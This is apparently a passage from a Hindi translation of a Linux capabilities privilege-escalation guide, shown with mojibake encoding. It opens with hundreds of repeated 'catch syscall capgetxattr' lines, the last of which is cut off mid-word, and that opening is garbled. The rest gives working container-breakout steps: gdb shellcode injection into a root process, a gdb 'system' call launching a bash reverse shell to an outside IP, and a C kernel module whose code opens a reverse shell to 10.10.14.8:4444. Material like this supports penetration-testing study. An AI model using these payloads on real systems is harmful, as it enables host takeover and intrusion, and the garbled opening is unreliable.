catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall cap
```bash
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) set {long}($rip+0) = 0x296a909090909090
(gdb) set {long}($rip+8) = 0x5e016a5f026a9958
(gdb) set {long}($rip+16) = 0x0002b9489748050f
(gdb) set {long}($rip+24) = 0x48510b0e0a0a2923
(gdb) set {long}($rip+32) = 0x582a6a5a106ae689
(gdb) set {long}($rip+40) = 0xceff485e036a050f
(gdb) set {long}($rip+48) = 0x6af675050f58216a
(gdb) set {long}($rip+56) = 0x69622fbb4899583b
(gdb) set {long}($rip+64) = 0x8948530068732f6e
(gdb) set {long}($rip+72) = 0x050fe689485752e7
(gdb) c
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§µ‡§æ‡§§‡§æ‡§µ‡§∞‡§£ ‡§ï‡•á ‡§∏‡§æ‡§• (Docker ‡§¨‡•ç‡§∞‡•á‡§ï‡§Ü‡§â‡§ü) - ‡§è‡§ï ‡§î‡§∞ gdb ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó**

‡§Ø‡§¶‡§ø **GDB** ‡§∏‡•ç‡§•‡§æ‡§™‡§ø‡§§ ‡§π‡•à (‡§Ø‡§æ ‡§Ü‡§™ ‡§á‡§∏‡•á `apk add gdb` ‡§Ø‡§æ `apt install gdb` ‡§ï‡•á ‡§∏‡§æ‡§• ‡§∏‡•ç‡§•‡§æ‡§™‡§ø‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç), ‡§§‡•ã ‡§Ü‡§™ **‡§Æ‡•á‡§ú‡§¨‡§æ‡§® ‡§∏‡•á ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ï‡•ã ‡§°‡•Ä‡§¨‡§ó ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç** ‡§î‡§∞ ‡§á‡§∏‡•á `system` ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§¨‡§®‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§ (‡§Ø‡§π ‡§§‡§ï‡§®‡•Ä‡§ï ‡§≠‡•Ä ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ `SYS_ADMIN` ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•ã‡§§‡•Ä ‡§π‡•à)**.**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
‡§Ü‡§™ ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§Æ‡§æ‡§Ç‡§° ‡§ï‡•á ‡§Ü‡§â‡§ü‡§™‡•Å‡§ü ‡§ï‡•ã ‡§®‡§π‡•Ä‡§Ç ‡§¶‡•á‡§ñ ‡§™‡§æ‡§è‡§Ç‡§ó‡•á, ‡§≤‡•á‡§ï‡§ø‡§® ‡§µ‡§π ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ (‡§á‡§∏‡§≤‡§ø‡§è ‡§è‡§ï ‡§∞‡•á‡§µ ‡§∂‡•á‡§≤ ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡•á‡§Ç)‡•§

{% hint style="warning" %}
‡§Ø‡§¶‡§ø ‡§Ü‡§™‡§ï‡•ã ‡§§‡•ç‡§∞‡•Å‡§ü‡§ø "No symbol "system" in current context." ‡§Æ‡§ø‡§≤‡§§‡•Ä ‡§π‡•à, ‡§§‡•ã gdb ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§è‡§ï ‡§™‡•ç‡§∞‡•ã‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§Æ‡•á‡§Ç ‡§∂‡•à‡§≤‡§ï‡•ã‡§° ‡§≤‡•ã‡§° ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§™‡§ø‡§õ‡§≤‡•á ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ï‡•Ä ‡§ú‡§æ‡§Ç‡§ö ‡§ï‡§∞‡•á‡§Ç‡•§
{% endhint %}

**‡§™‡§∞‡•ç‡§Ø‡§æ‡§µ‡§∞‡§£ ‡§ï‡•á ‡§∏‡§æ‡§• ‡§â‡§¶‡§æ‡§π‡§∞‡§£ (‡§°‡•â‡§ï‡§∞ ‡§¨‡•ç‡§∞‡•á‡§ï‡§Ü‡§â‡§ü) - ‡§∂‡•à‡§≤‡§ï‡•ã‡§° ‡§á‡§Ç‡§ú‡•á‡§ï‡•ç‡§∂‡§®**

‡§Ü‡§™ ‡§°‡•â‡§ï‡§∞ ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§∏‡§ï‡•ç‡§∑‡§Æ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§ì‡§Ç ‡§ï‡•Ä ‡§ú‡§æ‡§Ç‡§ö ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
# CAP_SYS_MODULE

[CAP_SYS_MODULE](https://man7.org/linux/man-pages/man7/capabilities.7.html) ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ï‡•ã ‡§ï‡§∞‡•ç‡§®‡§≤ ‡§Æ‡•â‡§°‡•ç‡§Ø‡•Ç‡§≤‡•ç‡§∏ (`init_module(2)`, `finit_module(2)` ‡§î‡§∞ `delete_module(2)` ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§ï‡•â‡§≤) ‡§ï‡•ã ‡§≤‡•ã‡§° ‡§î‡§∞ ‡§Ö‡§®‡§≤‡•ã‡§° ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡§æ ‡§π‡•à‡•§ ‡§á‡§∏‡§∏‡•á ‡§∏‡§∞‡§≤ ‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞ ‡§â‡§®‡•ç‡§®‡§Ø‡§® ‡§î‡§∞ ‡§∞‡§ø‡§Ç‡§ó-0 ‡§∏‡§Ç‡§ï‡§ü ‡§π‡•ã ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§ ‡§ï‡§∞‡•ç‡§®‡§≤ ‡§ï‡•ã ‡§á‡§ö‡•ç‡§õ‡§æ‡§®‡•Å‡§∏‡§æ‡§∞ ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à, ‡§ú‡§ø‡§∏‡§∏‡•á ‡§∏‡§≠‡•Ä ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§æ, ‡§≤‡§ø‡§®‡§ï‡•ç‡§∏ ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§æ ‡§Æ‡•â‡§°‡•ç‡§Ø‡•Ç‡§≤ ‡§î‡§∞ ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§™‡§∞‡§ø‡§µ‡§∞‡•ç‡§§‡§ø‡§§ ‡§π‡•ã ‡§ú‡§æ‡§§‡•á ‡§π‡•à‡§Ç‡•§\
**‡§á‡§∏‡§ï‡§æ ‡§Æ‡§§‡§≤‡§¨ ‡§π‡•à ‡§ï‡§ø ‡§Ü‡§™ ‡§π‡•ã‡§∏‡•ç‡§ü ‡§Æ‡§∂‡•Ä‡§® ‡§ï‡•á ‡§ï‡§∞‡•ç‡§®‡§≤ ‡§Æ‡•á‡§Ç ‡§ï‡§∞‡•ç‡§®‡§≤ ‡§Æ‡•â‡§°‡•ç‡§Ø‡•Ç‡§≤ ‡§°‡§æ‡§≤ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç/‡§®‡§ø‡§ï‡§æ‡§≤ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§**

**‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ï‡•á ‡§∏‡§æ‡§• ‡§â‡§¶‡§æ‡§π‡§∞‡§£**

‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§Æ‡•á‡§Ç ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä **`python`** ‡§ï‡•á ‡§™‡§æ‡§∏ ‡§Ø‡§π ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§π‡•à‡•§
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
‡§°‡§ø‡§´‡§º‡•â‡§≤‡•ç‡§ü ‡§∞‡•Ç‡§™ ‡§∏‡•á, **`modprobe`** ‡§ï‡§Æ‡§æ‡§Ç‡§° **`/lib/modules/$(uname -r)`** ‡§®‡§æ‡§Æ‡§ï ‡§®‡§ø‡§∞‡•ç‡§¶‡•á‡§∂‡§ø‡§ï‡§æ ‡§Æ‡•á‡§Ç ‡§°‡§ø‡§™‡•á‡§Ç‡§°‡•á‡§Ç‡§∏‡•Ä ‡§∏‡•Ç‡§ö‡•Ä ‡§î‡§∞ ‡§Æ‡•à‡§™ ‡§´‡§º‡§æ‡§á‡§≤ ‡§ï‡•Ä ‡§ú‡§æ‡§Ç‡§ö ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§\
‡§á‡§∏‡•á ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§ö‡§≤‡•ã ‡§è‡§ï ‡§®‡§ï‡§≤‡•Ä **lib/modules** ‡§´‡§º‡•ã‡§≤‡•ç‡§°‡§∞ ‡§¨‡§®‡§æ‡§§‡•á ‡§π‡•à‡§Ç:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
‡§§‡•ã **‡§ï‡§∞‡•ç‡§®‡§≤ ‡§Æ‡•â‡§°‡•ç‡§Ø‡•Ç‡§≤ ‡§ï‡•ã ‡§ï‡§Ç‡§™‡§æ‡§á‡§≤ ‡§ï‡§∞‡•á‡§Ç, ‡§®‡•Ä‡§ö‡•á 2 ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§¶‡§ø‡§è ‡§ó‡§è ‡§π‡•à‡§Ç ‡§î‡§∞** ‡§á‡§∏ ‡§´‡§º‡•ã‡§≤‡•ç‡§°‡§∞ ‡§Æ‡•á‡§Ç ‡§ï‡•â‡§™‡•Ä ‡§ï‡§∞‡•á‡§Ç:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
‡§Ö‡§Ç‡§§ ‡§Æ‡•á‡§Ç, ‡§á‡§∏ ‡§ï‡§∞‡•ç‡§®‡§≤ ‡§Æ‡•â‡§°‡•ç‡§Ø‡•Ç‡§≤ ‡§ï‡•ã ‡§≤‡•ã‡§° ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï ‡§™‡§æ‡§Ø‡§•‡§® ‡§ï‡•ã‡§° ‡§ï‡•ã ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡•á‡§Ç:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**‡§â‡§¶‡§æ‡§π‡§∞‡§£ 2 ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ï‡•á ‡§∏‡§æ‡§•**

‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§Æ‡•á‡§Ç ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä **`kmod`** ‡§ï‡•á ‡§™‡§æ‡§∏ ‡§Ø‡§π ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§π‡•à‡•§
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
‡§ú‡§ø‡§∏‡§ï‡§æ ‡§Æ‡§§‡§≤‡§¨ ‡§π‡•à ‡§ï‡§ø ‡§ï‡§∞‡•ç‡§®‡§≤ ‡§Æ‡•â‡§°‡•ç‡§Ø‡•Ç‡§≤ ‡§°‡§æ‡§≤‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡§Æ‡§æ‡§Ç‡§° **`insmod`** ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§ ‡§á‡§∏ ‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§Ç‡§ï ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§è‡§ï **‡§∞‡§ø‡§µ‡§∞‡•ç‡§∏ ‡§∂‡•à‡§≤** ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§®‡•Ä‡§ö‡•á ‡§¶‡§ø‡§è ‡§ó‡§è ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ï‡§æ ‡§™‡§æ‡§≤‡§® ‡§ï‡§∞‡•á‡§Ç‡•§

**‡§™‡§∞‡•ç‡§Ø‡§æ‡§µ‡§∞‡§£ ‡§ï‡•á ‡§∏‡§æ‡§• ‡§â‡§¶‡§æ‡§π‡§∞‡§£ (Docker ‡§¨‡•ç‡§∞‡•á‡§ï‡§Ü‡§â‡§ü)**

‡§Ü‡§™ ‡§°‡•â‡§ï‡§∞ ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ ‡§Æ‡•á‡§Ç ‡§∏‡§ï‡•ç‡§∑‡§Æ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§ì‡§Ç ‡§ï‡•Ä ‡§ú‡§æ‡§Ç‡§ö ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
‡§™‡§ø‡§õ‡§≤‡•á ‡§Ü‡§â‡§ü‡§™‡•Å‡§ü ‡§Æ‡•á‡§Ç ‡§Ü‡§™ ‡§¶‡•á‡§ñ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§ï‡§ø **SYS\_MODULE** ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§∏‡§ï‡•ç‡§∑‡§Æ ‡§π‡•à‡•§

**‡§ï‡§∞‡•á‡§®‡§≤ ‡§Æ‡•â‡§°‡•ç‡§Ø‡•Ç‡§≤** ‡§¨‡§®‡§æ‡§è‡§Ç ‡§ú‡•ã ‡§è‡§ï ‡§∞‡§ø‡§µ‡§∞‡•ç‡§∏ ‡§∂‡•á‡§≤ ‡§ö‡§≤‡§æ‡§è‡§ó‡§æ ‡§î‡§∞ ‡§á‡§∏‡•á **‡§ï‡§Ç‡§™‡§æ‡§á‡§≤** ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è **Makefile** ‡§¨‡§®‡§æ‡§è‡§Ç:

{% code title="reverse-shell.c" %}
```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```
